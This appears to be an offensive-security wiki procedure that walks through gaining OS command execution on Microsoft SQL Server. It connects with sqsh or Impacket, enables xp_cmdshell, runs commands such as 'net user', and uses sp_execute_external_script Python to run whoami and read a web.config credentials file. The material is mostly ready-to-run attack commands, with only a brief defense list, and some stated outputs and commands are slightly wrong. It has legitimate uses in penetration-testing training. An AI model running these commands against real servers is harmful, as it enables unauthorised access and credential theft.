---
id: 789fc0a4-9b9f-40ff-b182-d6ae7bcc7b45
name: MSSQL-Command-Execution-via-xp-cmdshell
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:33.965926+00:00'
updated_at: '2023-04-10T20:22:46.010368+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059.001 - Command and
    Scripting Interpreter: PowerShell]]
  - >-
    [[techniques/Server-Software-Component|T1505 - Server Software Component:
    SQL Stored Procedures]]
sub_techniques: []
tags:
  - '[[tags/MSSQL-Command-execution]]'
  - '[[tags/MSSQL-Injection]]'
commands:
  - '[[commands/mssql-connect-using-sqsh]]'
  - '[[commands/mssql-connect-using-impacket-mssqlclient]]'
  - '[[codes/MSSQL-Enable-xp-cmdshell]]'
  - '[[commands/mssql-xp-cmdshell-print-current-user]]'
  - '[[commands/mssql-xp-cmdshell-whoami-via-os-system]]'
  - '[[commands/mssql-sp-execute-external-script-read-file]]'
  - '[[commands/mssql-sp-execute-external-script-print-python-version]]'
platforms:
  - Windows
tools:
  - '[[tools/sqsh]]'
  - '[[tools/impacket-mssqlclient]]'
validated: true
---

# MSSQL-Command-Execution-via-xp-cmdshell

## Summary

This procedure demonstrates how to achieve remote command execution on a Microsoft SQL Server (MSSQL) instance by enabling and utilizing the xp_cmdshell extended stored procedure, often via SQL injection in a vulnerable web application. It covers connecting to the database, enabling the feature if disabled, executing system commands through xp_cmdshell, and alternative execution via Python scripts using sp_execute_external_script. This technique is commonly used in post-exploitation scenarios to run OS commands on the underlying Windows host.

## Description

xp_cmdshell is an extended stored procedure in MSSQL that allows execution of arbitrary operating system commands directly from SQL queries. Disabled by default since SQL Server 2005 for security reasons, it can be re-enabled by users with sysadmin privileges. Attackers typically exploit SQL injection vulnerabilities to inject SQL payloads that enable xp_cmdshell and then execute commands like directory listings, user enumeration, or network tests. Alternatively, if external scripting is enabled, sp_execute_external_script can run Python code to achieve similar OS interactions via Python's os module. This procedure assumes access to an MSSQL instance with sufficient privileges and focuses on Windows environments where MSSQL is commonly deployed. Success leads to command shell access, enabling further lateral movement or data exfiltration.

## Requirements

1. Valid credentials or SQL injection access to an MSSQL instance (e.g., sa user with sysadmin role).
2. Network connectivity to the MSSQL server port (default 1433).
3. Tools like sqsh or Impacket's mssqlclient for interaction.
4. For Python execution: External scripts feature enabled on the SQL Server (via sp_configure 'external scripts enabled', 1).
5. Target MSSQL version supporting xp_cmdshell (SQL Server 2000+ , though disabled by default post-2005).

## Defense

- Disable xp_cmdshell entirely using sp_configure 'xp_cmdshell', 0; RECONFIGURE; and restrict configuration changes to trusted admins.
- Implement strict input validation, prepared statements, and WAFs to prevent SQL injection.
- Use least privilege principles: Avoid sa credentials in applications; audit and limit sysadmin roles.
- Enable SQL Server auditing for configuration changes and extended procedure executions.
- Monitor for anomalous OS command executions via Windows Event Logs (Event ID 4688 for process creation) and SQL logs.

## Objectives

1. Establish a connection to the MSSQL instance for query execution.
2. Enable xp_cmdshell if disabled to allow OS command execution.
3. Execute reconnaissance commands (e.g., user enumeration, directory listing) via xp_cmdshell.
4. Use alternative methods like sp_execute_external_script for command execution when xp_cmdshell is unavailable.
5. Verify execution success through output from system commands.

## Instructions

### Step 1: Connect to the MSSQL Instance

**Context**: Establish a connection to the target MSSQL server using command-line tools to execute SQL queries. This step is prerequisite for all subsequent actions and assumes you have valid credentials or injection point access.

Use [[commands/mssql-connect-using-sqsh]] for a simple Sybase-compatible client:

```sql
sqsh -S $_MSSQL_IP -U $_USERNAME -P $_PASSWORD
```

> This connects to the server and drops you into an interactive SQL shell. Expected output includes a connection banner and prompt like "1> ". If connection fails, check credentials, IP, and port.

Alternatively, use [[commands/mssql-connect-using-impacket-mssqlclient]] for a Python-based client supporting Windows authentication:

```sql
python mssqlclient.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_MSSQL_IP -port $_PORT
```

> This provides an interactive shell with output showing connection success and a prompt. Use this for domain-joined environments.

**Success Indicators**:
- Interactive SQL prompt appears without authentication errors.
- Basic query like "SELECT @@VERSION;" returns server details.

### Step 2: Enable xp_cmdshell if Disabled

**Context**: xp_cmdshell is disabled by default; this step reconfigures the server to allow OS command execution. Requires sysadmin privileges.

Execute [[codes/MSSQL-Enable-xp-cmdshell]]:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

> This enables advanced options, then specifically activates xp_cmdshell. Expected output is configuration messages like "Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install." No errors indicate success.

**Success Indicators**:
- No permission denied errors.
- Subsequent test execution of xp_cmdshell works without failure.

### Step 3: Execute System Commands via xp_cmdshell

**Context**: With xp_cmdshell enabled, run OS commands to gather information. This directly executes Windows commands on the host.

Use [[commands/mssql-xp-cmdshell-print-current-user]] to enumerate users:

```sql
EXEC xp_cmdshell 'net user';
```

> Lists all local users. Expected output: A result set with columns like Output (e.g., "New local group added.") or command results.

For directory listing, adapt similar: EXEC xp_cmdshell 'cmd.exe dir c:';

For network test: EXEC xp_cmdshell 'ping 127.0.0.1';

**Success Indicators**:
- Command output appears in SQL result set (e.g., user list or directory contents).
- No "xp_cmdshell cannot be executed" errors.

### Step 4: Alternative Execution via sp_execute_external_script (Python)

**Context**: If xp_cmdshell is unavailable or restricted, use SQL Server's external scripting to run Python code that executes OS commands. Assumes external scripts are enabled.

To print current user with [[commands/mssql-xp-cmdshell-whoami-via-os-system]]:

```sql
EXEC sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))';
```

> Executes whoami via Python's os.system. Expected output: The current Windows user (e.g., "nt service\mssqlserver").

To read a file with [[commands/mssql-sp-execute-external-script-read-file]]:

```sql
EXEC sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())';
```

> Reads and prints file contents. Expected output: The XML config file content.

To print Python version with [[commands/mssql-sp-execute-external-script-print-python-version]]:

```sql
EXEC sp_execute_external_script @language = N'Python', @script = N'import sys; print(sys.version)';
```

> Shows Python version used by SQL Server. Expected output: Version string like "3.7.3 (default, Jun 27 2019, 00:00:00) [MSC v.1916 64 bit (AMD64)]".

For direct user print, use getpass module variant.

**Success Indicators**:
- Python script output in results (e.g., user name, file contents).
- No external script execution errors.
